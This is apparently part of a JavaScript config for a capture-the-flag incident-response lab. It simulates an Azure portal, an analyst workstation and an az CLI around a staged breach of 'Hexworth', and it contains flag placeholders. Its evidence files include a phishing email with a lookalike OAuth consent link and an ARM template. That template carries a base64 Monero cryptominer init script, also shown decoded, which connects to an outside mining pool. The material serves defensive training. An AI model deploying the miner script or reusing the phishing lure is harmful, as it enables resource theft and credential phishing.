                            <th style="padding:6px 8px; text-align:left; color:#0078d4; border-bottom:2px solid #dee2e6;">Application</th>
                            <th style="padding:6px 8px; text-align:left; color:#0078d4; border-bottom:2px solid #dee2e6;">Risk</th>
                            <th style="padding:6px 8px; text-align:left; color:#0078d4; border-bottom:2px solid #dee2e6;">Detail</th>
                        </tr></thead>
                        <tbody>${rows}</tbody>
                    </table>
                    </div>
                    <div style="margin-top:10px; font-size:0.72rem; color:#888; padding:8px; background:#f8f9fa; border-radius:4px;">
                        Note: signin-002 (07:02Z Dallas) and signin-001 (07:14Z Budapest) are 12 minutes apart — physical travel is impossible. OAuth token was replayed from attacker infrastructure.
                    </div>`;
                },
                formHandler: null
            },

            // ── Entra ID Users ──
            '/entra/users': {
                title: 'Entra ID — Users',
                html: function() {
                    const users = E1Config._azureData.users;
                    const rows = users.map(u => {
                        const riskColor = u.riskLevel === 'high' ? '#dc3545' : u.riskLevel === 'medium' ? '#fd7e14' : '#198754';
                        const rogueFlag = u.userPrincipalName.includes('phantom') ? ' <span style="background:#dc3545; color:#fff; font-size:0.62rem; padding:1px 5px; border-radius:8px;">ROGUE</span>' : '';
                        const mfaColor = u.mfaEnabled ? '#198754' : '#dc3545';
                        return `<tr style="border-bottom:1px solid #eee; ${u.userPrincipalName.includes('phantom') ? 'background:#fff5f5;' : ''}">
                            <td style="padding:6px 8px; font-size:0.75rem; color:#0078d4;">${u.displayName}${rogueFlag}</td>
                            <td style="padding:6px 8px; font-size:0.72rem; font-family:monospace;">${u.userPrincipalName}</td>
                            <td style="padding:6px 8px; font-size:0.72rem;">${u.jobTitle}</td>
                            <td style="padding:6px 8px; font-size:0.72rem;">${u.roles.join(', ')}</td>
                            <td style="padding:6px 8px; font-size:0.7rem; color:${mfaColor}; font-weight:700;">${u.mfaEnabled ? 'Enabled' : 'DISABLED'}</td>
                            <td style="padding:6px 8px;"><span style="font-size:0.68rem; background:${riskColor}; color:#fff; padding:2px 6px; border-radius:8px;">${u.riskLevel.toUpperCase()}</span></td>
                        </tr>`;
                    }).join('');
                    return `
                    <div style="font-weight:700; color:#1a1a2e; margin-bottom:14px; padding-bottom:10px; border-bottom:1px solid #ddd;">Entra ID — All Users</div>
                    <div style="background:#fff3cd; border:1px solid #ffc107; border-radius:4px; padding:8px 12px; margin-bottom:14px; font-size:0.77rem; color:#533f03;">
                        Warning: x.phantom@protonmail.com has been granted Global Administrator. This account was added by lena.kovacs@hexworth-corp.com on 2026-03-18T08:35:02Z.
                    </div>
                    <table style="width:100%; border-collapse:collapse;">
                        <thead><tr style="background:#f8f9fa;">
                            <th style="padding:6px 8px; text-align:left; color:#0078d4; border-bottom:2px solid #dee2e6; font-size:0.75rem;">Display Name</th>
                            <th style="padding:6px 8px; text-align:left; color:#0078d4; border-bottom:2px solid #dee2e6; font-size:0.75rem;">UPN</th>
                            <th style="padding:6px 8px; text-align:left; color:#0078d4; border-bottom:2px solid #dee2e6; font-size:0.75rem;">Job Title</th>
                            <th style="padding:6px 8px; text-align:left; color:#0078d4; border-bottom:2px solid #dee2e6; font-size:0.75rem;">Roles</th>
                            <th style="padding:6px 8px; text-align:left; color:#0078d4; border-bottom:2px solid #dee2e6; font-size:0.75rem;">MFA</th>
                            <th style="padding:6px 8px; text-align:left; color:#0078d4; border-bottom:2px solid #dee2e6; font-size:0.75rem;">Risk</th>
                        </tr></thead>
                        <tbody>${rows}</tbody>
                    </table>`;
                },
                formHandler: null
            },

            // ── Activity Log ──
            '/activity-log': {
                title: 'Azure Monitor — Activity Log',
                html: function() {
                    E1Config._activityLogReviewed = true;
                    const entries = E1Config._azureData.activityLog;
                    const rows = entries.map(e => {
                        const isRogue = e.caller.includes('phantom') || e.caller.includes('kovacs');
                        const rowBg = isRogue ? 'background:#fff5f5;' : '';
                        const callerColor = isRogue ? '#dc3545' : '#555';
                        return `<tr style="border-bottom:1px solid #eee; ${rowBg}">
                            <td style="padding:5px 8px; font-size:0.68rem; color:#888; white-space:nowrap;">${e.timestamp}</td>
                            <td style="padding:5px 8px; font-size:0.7rem; font-family:monospace; color:#333; max-width:220px; overflow:hidden; text-overflow:ellipsis;" title="${e.operationName}">${e.operationName.split('/').slice(-2).join('/')}</td>
                            <td style="padding:5px 8px; font-size:0.7rem; color:${callerColor};">${e.caller}</td>
                            <td style="padding:5px 8px; font-size:0.7rem; color:#198754;">${e.status}</td>
                            <td style="padding:5px 8px; font-size:0.68rem; color:#666;">${e.description.substring(0, 80)}${e.description.length > 80 ? '...' : ''}</td>
                        </tr>`;
                    }).join('');
                    return `
                    <div style="font-weight:700; color:#1a1a2e; margin-bottom:14px; padding-bottom:10px; border-bottom:1px solid #ddd;">Azure Monitor — Activity Log</div>
                    <div style="font-size:0.72rem; color:#888; margin-bottom:10px;">Subscription: HEXWORTH-PROD-001 | Timespan: 2026-03-18 08:30Z to 09:20Z | Highlighted rows = attacker-originated</div>
                    <div style="overflow-x:auto;">
                    <table style="width:100%; border-collapse:collapse;">
                        <thead><tr style="background:#f8f9fa;">
                            <th style="padding:5px 8px; text-align:left; color:#0078d4; border-bottom:2px solid #dee2e6; font-size:0.72rem; white-space:nowrap;">Timestamp (UTC)</th>
                            <th style="padding:5px 8px; text-align:left; color:#0078d4; border-bottom:2px solid #dee2e6; font-size:0.72rem;">Operation</th>
                            <th style="padding:5px 8px; text-align:left; color:#0078d4; border-bottom:2px solid #dee2e6; font-size:0.72rem;">Caller</th>
                            <th style="padding:5px 8px; text-align:left; color:#0078d4; border-bottom:2px solid #dee2e6; font-size:0.72rem;">Status</th>
                            <th style="padding:5px 8px; text-align:left; color:#0078d4; border-bottom:2px solid #dee2e6; font-size:0.72rem;">Description</th>
                        </tr></thead>
                        <tbody>${rows}</tbody>
                    </table>
                    </div>
                    <div style="margin-top:8px; font-size:0.7rem; color:#aaa; font-style:italic;">Tip: SQL export entry at 09:14:22Z contains a data classification tag — examine the full description in the terminal.</div>`;
                },
                formHandler: null
            },

            // ── Virtual Machines ──
            '/compute/vms': {
                title: 'Azure — Virtual Machines',
                html: function() {
                    E1Config._rogueVmsFound = true;
                    const vms = E1Config._azureData.virtualMachines;
                    const rows = vms.map(vm => {
                        const isRogue = vm.name.includes('miner');
                        const rowBg = isRogue ? 'background:#fff5f5;' : '';
                        return `<tr style="border-bottom:1px solid #eee; ${rowBg}">
                            <td style="padding:6px 8px; font-size:0.78rem; color:${isRogue ? '#dc3545' : '#0078d4'}; font-weight:${isRogue ? '700' : 'normal'};">${vm.name}${isRogue ? ' <span style="font-size:0.62rem; background:#dc3545; color:#fff; padding:1px 5px; border-radius:8px;">ROGUE</span>' : ''}</td>
                            <td style="padding:6px 8px; font-size:0.75rem;">${vm.resourceGroup}</td>
                            <td style="padding:6px 8px; font-size:0.75rem;">${vm.size}</td>
                            <td style="padding:6px 8px;"><span style="font-size:0.7rem; background:#198754; color:#fff; padding:2px 6px; border-radius:8px;">${vm.status}</span></td>
                            <td style="padding:6px 8px; font-size:0.72rem;">${vm.created}</td>
                            <td style="padding:6px 8px; font-size:0.7rem; color:#666;">${vm.tags.owner}</td>
                        </tr>`;
                    }).join('');
                    return `
                    <div style="font-weight:700; color:#1a1a2e; margin-bottom:14px; padding-bottom:10px; border-bottom:1px solid #ddd;">Virtual Machines — HEXWORTH-PROD-001</div>
                    <div style="background:#fff3cd; border:1px solid #ffc107; border-radius:4px; padding:8px 12px; margin-bottom:12px; font-size:0.77rem; color:#533f03;">
                        3 unauthorized VMs detected (Standard_NC6 GPU-optimized — probable cryptomining). Created 2026-03-18 by x.phantom@protonmail.com.
                    </div>
                    <table style="width:100%; border-collapse:collapse;">
                        <thead><tr style="background:#f8f9fa;">
                            <th style="padding:6px 8px; text-align:left; color:#0078d4; border-bottom:2px solid #dee2e6; font-size:0.75rem;">Name</th>
                            <th style="padding:6px 8px; text-align:left; color:#0078d4; border-bottom:2px solid #dee2e6; font-size:0.75rem;">Resource Group</th>
                            <th style="padding:6px 8px; text-align:left; color:#0078d4; border-bottom:2px solid #dee2e6; font-size:0.75rem;">Size</th>
                            <th style="padding:6px 8px; text-align:left; color:#0078d4; border-bottom:2px solid #dee2e6; font-size:0.75rem;">Status</th>
                            <th style="padding:6px 8px; text-align:left; color:#0078d4; border-bottom:2px solid #dee2e6; font-size:0.75rem;">Created</th>
                            <th style="padding:6px 8px; text-align:left; color:#0078d4; border-bottom:2px solid #dee2e6; font-size:0.75rem;">Owner Tag</th>
                        </tr></thead>
                        <tbody>${rows}</tbody>
                    </table>`;
                },
                formHandler: null
            },

            // ── NSG Rules ──
            '/network/nsg': {
                title: 'Azure — Network Security Groups',
                html: function() {
                    E1Config._nsgReviewed = true;
                    const rules = E1Config._azureData.nsgRules;
                    const rows = rules.map(r => {
                        const rowBg = r.rogue ? 'background:#fff5f5;' : '';
                        return `<tr style="border-bottom:1px solid #eee; ${rowBg}">
                            <td style="padding:6px 8px; font-size:0.75rem; color:${r.rogue ? '#dc3545' : '#333'}; font-weight:${r.rogue ? '700' : 'normal'};">${r.name}${r.rogue ? ' <span style="font-size:0.62rem; background:#dc3545; color:#fff; padding:1px 5px; border-radius:8px;">UNAUTHORIZED</span>' : ''}</td>
                            <td style="padding:6px 8px; font-size:0.72rem;">${r.direction}</td>
                            <td style="padding:6px 8px; font-size:0.72rem;">${r.priority}</td>
                            <td style="padding:6px 8px; font-size:0.72rem; font-family:monospace; font-weight:700; color:${r.rogue ? '#dc3545' : '#333'};">${r.destinationPortRange}</td>
                            <td style="padding:6px 8px; font-size:0.72rem; font-family:monospace; color:${r.rogue ? '#dc3545' : '#888'};">${r.sourceAddressPrefix}</td>
                            <td style="padding:6px 8px;"><span style="font-size:0.7rem; background:${r.access === 'Allow' ? '#198754' : '#dc3545'}; color:#fff; padding:2px 6px; border-radius:8px;">${r.access}</span></td>
                        </tr>`;
                    }).join('');
                    return `
                    <div style="font-weight:700; color:#1a1a2e; margin-bottom:14px; padding-bottom:10px; border-bottom:1px solid #ddd;">NSG: nsg-prod — Security Rules</div>
                    <div style="background:#fff3cd; border-left:4px solid #dc3545; padding:10px 14px; margin-bottom:12px; font-size:0.8rem; color:#533f03;">
                        Critical: Rule allow-rdp-internet opens TCP port 3389 (RDP) to 0.0.0.0/0 (the entire internet). This rule was added on 2026-03-18T09:08:19Z by x.phantom@protonmail.com.
                    </div>
                    <table style="width:100%; border-collapse:collapse;">
                        <thead><tr style="background:#f8f9fa;">
                            <th style="padding:6px 8px; text-align:left; color:#0078d4; border-bottom:2px solid #dee2e6; font-size:0.75rem;">Rule Name</th>
                            <th style="padding:6px 8px; text-align:left; color:#0078d4; border-bottom:2px solid #dee2e6; font-size:0.75rem;">Direction</th>
                            <th style="padding:6px 8px; text-align:left; color:#0078d4; border-bottom:2px solid #dee2e6; font-size:0.75rem;">Priority</th>
                            <th style="padding:6px 8px; text-align:left; color:#0078d4; border-bottom:2px solid #dee2e6; font-size:0.75rem;">Port</th>
                            <th style="padding:6px 8px; text-align:left; color:#0078d4; border-bottom:2px solid #dee2e6; font-size:0.75rem;">Source</th>
                            <th style="padding:6px 8px; text-align:left; color:#0078d4; border-bottom:2px solid #dee2e6; font-size:0.75rem;">Access</th>
                        </tr></thead>
                        <tbody>${rows}</tbody>
                    </table>`;
                },
                formHandler: null
            },

            // ── Storage Accounts ──
            '/storage': {
                title: 'Azure — Storage Accounts',
                html: `
                <div style="font-weight:700; color:#1a1a2e; margin-bottom:14px; padding-bottom:10px; border-bottom:1px solid #ddd;">Storage Accounts — HEXWORTH-PROD-001</div>
                <div style="background:#fff3cd; border:1px solid #ffc107; border-radius:4px; padding:8px 12px; margin-bottom:12px; font-size:0.77rem; color:#533f03;">
                    Unauthorized storage account stexfildata2026 detected with public blob access enabled. Contains CRM database export.
                </div>
                <table style="width:100%; border-collapse:collapse; font-size:0.78rem;">
                    <thead><tr style="background:#f8f9fa;">
                        <th style="padding:6px 8px; text-align:left; color:#0078d4; border-bottom:2px solid #dee2e6;">Name</th>
                        <th style="padding:6px 8px; text-align:left; color:#0078d4; border-bottom:2px solid #dee2e6;">Type</th>
                        <th style="padding:6px 8px; text-align:left; color:#0078d4; border-bottom:2px solid #dee2e6;">Public Access</th>
                        <th style="padding:6px 8px; text-align:left; color:#0078d4; border-bottom:2px solid #dee2e6;">Created</th>
                        <th style="padding:6px 8px; text-align:left; color:#0078d4; border-bottom:2px solid #dee2e6;">Containers</th>
                    </tr></thead>
                    <tbody>
                        <tr style="border-bottom:1px solid #eee;">
                            <td style="padding:6px 8px; color:#0078d4;">sthexworthprod</td>
                            <td style="padding:6px 8px;">RA-GRS</td>
                            <td style="padding:6px 8px; color:#198754;">Disabled</td>
                            <td style="padding:6px 8px; color:#666;">2025-09-15</td>
                            <td style="padding:6px 8px; color:#888;">backups, logs</td>
                        </tr>
                        <tr style="background:#fff5f5; border-bottom:1px solid #eee;">
                            <td style="padding:6px 8px; color:#dc3545; font-weight:700;">stexfildata2026 <span style="font-size:0.62rem; background:#dc3545; color:#fff; padding:1px 5px; border-radius:8px;">ROGUE</span></td>
                            <td style="padding:6px 8px;">RA-GRS</td>
                            <td style="padding:6px 8px; color:#dc3545; font-weight:700;">ENABLED</td>
                            <td style="padding:6px 8px; color:#dc3545;">2026-03-18</td>
                            <td style="padding:6px 8px; color:#dc3545;">exfil-drop (crm-export-20260318.bacpac — 6.4GB)</td>
                        </tr>
                    </tbody>
                </table>`,
                formHandler: null
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // FILESYSTEM (investigation workstation — analyst)
    // ═══════════════════════════════════════════════════════

    filesystem: {
        '/': {
            type: 'dir',
            children: {
                'home': {
                    type: 'dir',
                    children: {
                        'analyst': {
                            type: 'dir',
                            children: {
                                'notes.txt': {
                                    type: 'file',
                                    content: '=== INCIDENT RESPONSE NOTES — INC-2026-0087 ===\nDate: 2026-03-18\nAnalyst: [you]\n\nSentinel Alert: Impossible travel detected for lena.kovacs@hexworth-corp.com\n  - Login 1: 07:02Z — Dallas, TX (205.46.78.12) — LAPTOP-LK-2024\n  - Login 2: 07:14Z — Budapest, Hungary (81.23.14.55) — Unknown device\n  - Time delta: 12 minutes. Physical travel: ~10 hours. OAuth token replay confirmed.\n\nTODO:\n1. Review Entra ID sign-in logs in portal or az ad signin-logs list\n2. Check Activity Log for admin actions post-08:30Z\n3. Find the phishing email in /home/analyst/evidence/emails/\n4. Enumerate rogue resources in az vm list / az network nsg rule list\n5. Pull ARM template from /home/analyst/evidence/arm-templates/\n6. Execute containment playbook\n\nKey suspect account: x.phantom@protonmail.com (added as Global Admin at 08:35:02Z)\n'
                                },
                                '.bash_history': {
                                    type: 'file',
                                    content: 'az login --tenant a3f82b19-cc41-4e8d-b712-9d04e1f73a2c\naz account set --subscription HEXWORTH-PROD-001\naz monitor activity-log list --start-time 2026-03-18T08:00:00Z\naz ad user list\naz vm list -o table\naz network nsg rule list --nsg-name nsg-prod -g rg-hexworth-compute\n'
                                },
                                'evidence': {
                                    type: 'dir',
                                    children: {
                                        'emails': {
                                            type: 'dir',
                                            children: {
                                                'phish-lena-kovacs.eml': {
                                                    type: 'file',
                                                    content: 'From: "Microsoft Teams" <no-reply@micros0ft-teams-notify.com>\nTo: lena.kovacs@hexworth-corp.com\nSubject: Action Required: Review shared document — Q1 Budget Planning.docx\nDate: Mon, 15 Mar 2026 14:22:09 -0600\nMessage-ID: <20260315142209.ghost@micros0ft-teams-notify.com>\nReturn-Path: {{FLAG:user}}\nX-Mailer: PhishKit v3.1 (Evilginx3)\nMIME-Version: 1.0\nContent-Type: text/html; charset=utf-8\n\n<!DOCTYPE html>\n<html>\n<body style="font-family:Calibri,sans-serif;">\n<p>Hi Lena,</p>\n<p>Marcus has shared a document with you in Microsoft Teams.</p>\n<p><a href="https://micros0ft-teams-notify.com/oauth/consent?client_id=teams&redirect_uri=https://micros0ft-teams-notify.com/callback&scope=openid+offline_access+User.Read+Mail.Read+Files.ReadWrite.All">Click here to view: Q1 Budget Planning.docx</a></p>\n<p>This link will expire in 24 hours.</p>\n<p>The Microsoft Teams Team</p>\n</body>\n</html>\n\n--- HEADER ANALYSIS NOTE ---\nReturn-Path points to attacker C2 infrastructure.\nOAuth consent URL requests: openid, offline_access, User.Read, Mail.Read, Files.ReadWrite.All\nThe offline_access scope grants a long-lived refresh token — this is the token that was replayed.\n'
                                                },
                                                'phish-analysis.txt': {
                                                    type: 'file',
                                                    content: 'PHISHING EMAIL ANALYSIS\n=======================\nFile: phish-lena-kovacs.eml\nReceived: 2026-03-15 14:22Z\nClicked: 2026-03-15 14:47Z (25 minutes after receipt)\n\nDomain analysis:\n  Sender domain: micros0ft-teams-notify.com\n  Zero-for-O substitution in "Microsoft"\n  Domain registered: 2026-03-14 (1 day before campaign)\n  Registrar: NameCheap (anonymous registration)\n  Hosting: 81.23.14.55 (Budapest, Hungary)\n  This IP matches the impossible travel login location\n\nOAuth consent harvested:\n  Scope: offline_access (refresh token = long-lived access)\n  Scope: Files.ReadWrite.All (cloud storage access)\n  Application name shown to user: "Microsoft Teams Integration"\n  Actual redirect: https://micros0ft-teams-notify.com/callback\n\nRefresh token replayed 3 days later: 2026-03-18 07:14Z\n'
                                                }
                                            }
                                        },
                                        'arm-templates': {
                                            type: 'dir',
                                            children: {
                                                'cryptominer-vm.json': {
                                                    type: 'file',
                                                    content: '{\n  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",\n  "contentVersion": "1.0.0.0",\n  "parameters": {\n    "vmName": { "type": "string", "defaultValue": "vm-miner-node" },\n    "vmSize": { "type": "string", "defaultValue": "Standard_NC6" },\n    "adminUsername": { "type": "string", "defaultValue": "mineadm" },\n    "adminPassword": { "type": "securestring" }\n  },\n  "resources": [\n    {\n      "type": "Microsoft.Compute/virtualMachines",\n      "apiVersion": "2023-07-01",\n      "name": "[parameters(\'vmName\')]",\n      "location": "eastus",\n      "properties": {\n        "hardwareProfile": { "vmSize": "[parameters(\'vmSize\')]" },\n        "osProfile": {\n          "computerName": "[parameters(\'vmName\')]",\n          "adminUsername": "[parameters(\'adminUsername\')]",\n          "adminPassword": "[parameters(\'adminPassword\')]",\n          "customData": "IyEvYmluL2Jhc2gKIyBYTVIgTW9uZXJvIE1pbmVyIEluaXQgU2NyaXB0CiMgT3BlcmF0b3I6IHgucGhhbnRvbUBwcm90b25tYWlsLmNvbQoKYXB0LWdldCB1cGRhdGUgLXkgJiYgYXB0LWdldCBpbnN0YWxsIC15IGNjbWluZXIgbGliY3VybDQtb3BlbnNzbC1kZXYKCiMgUG9vbDogcG9vbC5taW5leG1yLmNvbTo0NDQ0CiMgV2FsbGV0OiA0OXZqSzJXWEw4dHUzNFpoWjJ5QlVFdUVIR3dVUk1ueHFKTmZCeUdQcmdBc1JHVDdBOXdQa2pkSnhESgojCiMgRkxBRzoge3tGTEFHOnJvb3R9fQojCmNjbWluZXIgLW8gc3RyYXR1bSt0Y3A6Ly9wb29sLm1pbmV4bXIuY29tOjQ0NDQgLXUgNDl2aks0V1hMOHR1MzRaaFoyeUJVRXVFSEd3VVJNBNZ4cUpOZkJ5R1ByZ0FzUkdUN0E5d1BramRKeERKIC1wIHguMCAtLW1heC10ZW1wIDg1IC0tbnVtLXRocmVhZHMgNiAmCmVjaG8gIlttaW5lcl0gc3RhcnRlZCIgPj4gL3Zhci9sb2cvbWluZXIubG9n",\n          "comment_customData_decoded": "#!/bin/bash\\n# XMR Monero Miner Init Script\\n# Operator: x.phantom@protonmail.com\\n\\napt-get update -y && apt-get install -y ccminer libcurl4-openssl-dev\\n\\n# Pool: pool.minexmr.com:4444\\n# Wallet: 49vjK2WXL8tu34ZhZ2yBUEuEHGwURMnxqJNfByGPrgAsRGT7A9wPkjdJxDJ\\n#\\n# FLAG: {{FLAG:root}}\\n#\\nccminer -o stratum+tcp://pool.minexmr.com:4444 -u 49vjK4WXL8tu34ZhZ2yBUEuEHGwURMnxqJNfByGPrgAsRGT7A9wPkjdJxDJ -p x.0 --max-temp 85 --num-threads 6 &\\necho \\"[miner] started\\" >> /var/log/miner.log"\n        },\n        "storageProfile": {\n          "imageReference": { "publisher": "Canonical", "offer": "0001-com-ubuntu-server-jammy", "sku": "22_04-lts-gen2", "version": "latest" }\n        },\n        "networkProfile": {\n          "networkInterfaces": [{ "id": "[resourceId(\'Microsoft.Network/networkInterfaces\', concat(parameters(\'vmName\'), \'-nic\'))]" }]\n        }\n      }\n    }\n  ]\n}\n\n--- FORENSIC NOTE ---\nThe customData field is base64-encoded cloud-init. Decode to find the miner configuration and the root flag.\nWallet address links to known XMR mining pool. 3 instances deployed = ~72 GPU-hours per day billed to Hexworth subscription.\n'
                                                },
                                                'arm-decode.txt': {
                                                    type: 'file',
                                                    content: '# ARM Template customData Decoder\n# The customData field in osProfile is base64-encoded\n# To decode:\n#   echo "<base64>" | base64 -d\n# Or use: az deployment group show ... and pipe to jq\n\n# Decoded customData from cryptominer-vm.json:\n\n#!/bin/bash\n# XMR Monero Miner Init Script\n# Operator: x.phantom@protonmail.com\n\napt-get update -y && apt-get install -y ccminer libcurl4-openssl-dev\n\n# Pool: pool.minexmr.com:4444\n# Wallet: 49vjK4WXL8tu34ZhZ2yBUEuEHGwURMnxqJNfByGPrgAsRGT7A9wPkjdJxDJ\n#\n# FLAG: {{FLAG:root}}\n#\nccminer -o stratum+tcp://pool.minexmr.com:4444 -u 49vjK4WXL8tu34ZhZ2yBUEuEHGwURMnxqJNfByGPrgAsRGT7A9wPkjdJxDJ -p x.0 --max-temp 85 --num-threads 6 &\necho "[miner] started" >> /var/log/miner.log\n'
                                                }
                                            }
                                        },
                                        'activity-log-raw.json': {
                                            type: 'file',
                                            content: '[\n  {\n    "timestamp": "2026-03-18T08:35:02Z",\n    "operationName": "Microsoft.Authorization/roleAssignments/write",\n    "caller": "lena.kovacs@hexworth-corp.com",\n    "status": "Succeeded",\n    "resourceGroup": "rg-hexworth-core",\n    "description": "Added user x.phantom@protonmail.com to role: Global Administrator"\n  },\n  {\n    "timestamp": "2026-03-18T08:38:14Z",\n    "operationName": "Microsoft.Authorization/policies/write",\n    "caller": "lena.kovacs@hexworth-corp.com",\n    "status": "Succeeded",\n    "description": "Modified conditional access policy: disabled MFA requirement — added 81.23.14.0/24 as trusted"\n  },\n  {\n    "timestamp": "2026-03-18T09:02:33Z",\n    "operationName": "Microsoft.Compute/virtualMachines/write",\n    "caller": "x.phantom@protonmail.com",\n    "status": "Succeeded",\n    "description": "Deployed VM: vm-miner-node-01 (Standard_NC6)"\n  },\n  {\n    "timestamp": "2026-03-18T09:08:19Z",\n    "operationName": "Microsoft.Network/networkSecurityGroups/securityRules/write",\n    "caller": "x.phantom@protonmail.com",\n    "status": "Succeeded",\n    "description": "Added NSG inbound rule: Allow TCP 3389 from 0.0.0.0/0"\n  },\n  {\n    "timestamp": "2026-03-18T09:14:22Z",\n    "operationName": "Microsoft.Sql/servers/databases/export",\n    "caller": "x.phantom@protonmail.com",\n    "status": "Succeeded",\n    "description": "Database export: sqldb-hexworth-crm -> stexfildata2026/crm-export-20260318.bacpac (6.4GB). Classification tag: {{FLAG:internal}}"\n  }\n]\n'
                                                },
                                        'signin-logs-suspicious.json': {
                                            type: 'file',
                                            content: '[\n  {\n    "id": "signin-001",\n    "timestamp": "2026-03-18T07:14:22Z",\n    "userPrincipalName": "lena.kovacs@hexworth-corp.com",\n    "ipAddress": "81.23.14.55",\n    "location": "Budapest, Hungary",\n    "appDisplayName": "Microsoft 365",\n    "status": "Success",\n    "riskLevel": "high",\n    "riskDetail": "Impossible travel",\n    "device": "Unknown"\n  },\n  {\n    "id": "signin-002",\n    "timestamp": "2026-03-18T07:02:11Z",\n    "userPrincipalName": "lena.kovacs@hexworth-corp.com",\n    "ipAddress": "205.46.78.12",\n    "location": "Dallas, TX, US",\n    "appDisplayName": "Microsoft 365",\n    "status": "Success",\n    "riskLevel": "low",\n    "riskDetail": "None",\n    "device": "LAPTOP-LK-2024"\n  }\n]\n'
                                        }
                                    }
                                },
                                'containment': {
                                    type: 'dir',
                                    children: {
                                        'playbook.sh': {
                                            type: 'file',
                                            content: '#!/bin/bash\n# Containment Playbook — INC-2026-0087\n# Run these commands in sequence\n\n# 1. Revoke all sessions for compromised account\naz ad user revoke-sign-in-sessions --id lena.kovacs@hexworth-corp.com\n\n# 2. Remove rogue Global Admin role\naz role assignment delete --assignee x.phantom@protonmail.com --role "Global Administrator"\n\n# 3. Disable attacker account\naz ad user update --id x.phantom@protonmail.com --account-enabled false\n\n# 4. Delete rogue VMs\naz vm delete --name vm-miner-node-01 --resource-group rg-hexworth-compute --yes\naz vm delete --name vm-miner-node-02 --resource-group rg-hexworth-compute --yes\naz vm delete --name vm-miner-node-03 --resource-group rg-hexworth-compute --yes\n\n# 5. Remove unauthorized NSG rule\naz network nsg rule delete --name allow-rdp-internet --nsg-name nsg-prod --resource-group rg-hexworth-compute\n\n# 6. Delete exfil storage account\naz storage account delete --name stexfildata2026 --resource-group rg-hexworth-data --yes\n\n# 7. Re-enable MFA for Lena Kovacs\n# (Handled via Entra ID portal — manual step)\n\n# 8. Restore conditional access policy\naz ad policy update --id ConditionalAccess-MFA # restore from backup\n\necho "Containment complete. Generate incident report."\n'
                                        },
                                        'incident-timeline.txt': {
                                            type: 'file',
                                            content: 'INCIDENT TIMELINE — INC-2026-0087\n===================================\n\n2026-03-15 14:22Z  Phishing email delivered to lena.kovacs@hexworth-corp.com\n2026-03-15 14:47Z  Victim clicked OAuth consent link — refresh token exfiltrated\n2026-03-18 07:02Z  Victim authenticated from Dallas, TX (LAPTOP-LK-2024) — legitimate\n2026-03-18 07:14Z  Attacker replayed OAuth token from Budapest, Hungary (81.23.14.55)\n2026-03-18 07:20Z  Sentinel impossible travel alert fired (INC-2026-0087)\n2026-03-18 08:31Z  Attacker accessed Azure Portal with stolen token\n2026-03-18 08:33Z  Attacker authenticated to Azure AD PowerShell\n2026-03-18 08:35Z  Attacker added x.phantom@protonmail.com as Global Administrator\n2026-03-18 08:38Z  Conditional access policy modified — MFA disabled for 81.23.14.0/24\n2026-03-18 08:41Z  MFA registration removed from lena.kovacs account\n2026-03-18 09:02Z  vm-miner-node-01 deployed (Standard_NC6, XMR mining script)\n2026-03-18 09:04Z  vm-miner-node-02 deployed\n2026-03-18 09:06Z  vm-miner-node-03 deployed\n2026-03-18 09:08Z  NSG rule added: RDP (3389) open to 0.0.0.0/0\n2026-03-18 09:11Z  Storage account stexfildata2026 created (public blob)\n2026-03-18 09:14Z  sqldb-hexworth-crm exported to stexfildata2026 (6.4GB CRM data)\n2026-03-18 09:18Z  Export blob confirmed written to exfil-drop container\n2026-03-18 [NOW]   Investigation in progress — containment pending\n\nDATAGE ASSESSMENT:\n  - 6.4GB CRM database (customer PII, contracts, billing) exfiltrated\n  - Azure subscription exposed to cryptomining billing abuse\n  - RDP exposed to internet — lateral movement risk to VMs\n  - Global Admin compromised — full tenant control achieved by attacker\n'
                                        }
                                    }
                                }
                            }
                        }
                    }
                },
                'etc': {
                    type: 'dir',
                    children: {
                        'hostname': {
                            type: 'file',
                            content: 'azure-inv-ws'
                        },
                        'passwd': {
                            type: 'file',
                            content: 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nanalyst:x:1000:1000:Azure Analyst:/home/analyst:/bin/bash'
                        }
                    }
                },
                'tmp': {
                    type: 'dir',
                    children: {}
                },
                'opt': {
                    type: 'dir',
                    children: {
                        'az': {
                            type: 'dir',
                            children: {
                                'README.txt': {
                                    type: 'file',
                                    content: 'Azure CLI 2.58.0\nPre-authenticated to tenant: HEXWORTH-CORP\nSubscription: HEXWORTH-PROD-001\n\nUseful commands:\n  az monitor activity-log list --start-time 2026-03-18T08:00:00Z\n  az ad signin-logs list\n  az vm list -o table\n  az network nsg rule list --nsg-name nsg-prod -g rg-hexworth-compute\n  az ad user list -o table\n  az role assignment list --all\n  az deployment group show -g rg-hexworth-compute -n deploy-miner-arm-01\n'
                                }
                            }
                        }
                    }
                }
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // TERMINAL COMMANDS (az CLI simulation + investigation tools)
    // ═══════════════════════════════════════════════════════

    commands: {

        // ── Azure CLI: account ──
        'az': function(args, term, engine) {
            if (args.length === 0) return 'Azure CLI 2.58.0\nUsage: az [command] [options]\nCommon: az account show | az ad user list | az vm list | az monitor activity-log list\nRun az --help for full reference.';
            const sub = args[0];

            // az login
            if (sub === 'login') {
                return 'Already authenticated.\nTenant: HEXWORTH-CORP (a3f82b19-cc41-4e8d-b712-9d04e1f73a2c)\nSubscription: HEXWORTH-PROD-001\n\n[+] No action needed — pre-authenticated.';
            }

            // az account show / set
            if (sub === 'account') {
                if (args[1] === 'show') {
                    return '{\n  "environmentName": "AzureCloud",\n  "id": "8b3e91f2-da12-4c78-bc9e-1a04d7e3f5b0",\n  "isDefault": true,\n  "name": "HEXWORTH-PROD-001",\n  "state": "Enabled",\n  "tenantId": "a3f82b19-cc41-4e8d-b712-9d04e1f73a2c",\n  "user": { "name": "analyst@hexworth-corp.com", "type": "user" }\n}';
                }
                return 'Usage: az account show | az account list | az account set --subscription <id>';
            }

            // az monitor activity-log list
            if (sub === 'monitor') {
                if (args[1] === 'activity-log' && args[2] === 'list') {
                    E1Config._activityLogReviewed = true;
                    const filterIdx = args.indexOf('--filter');
                    let entries = E1Config._azureData.activityLog;

                    // Filter for role assignments if requested
                    if (filterIdx !== -1) {
                        const filterVal = args.slice(filterIdx + 1).join(' ').toLowerCase();
                        if (filterVal.includes('roleassignment') || filterVal.includes('role')) {
                            entries = entries.filter(e => e.operationName.includes('roleAssignments') || e.operationName.includes('policies'));
                        }
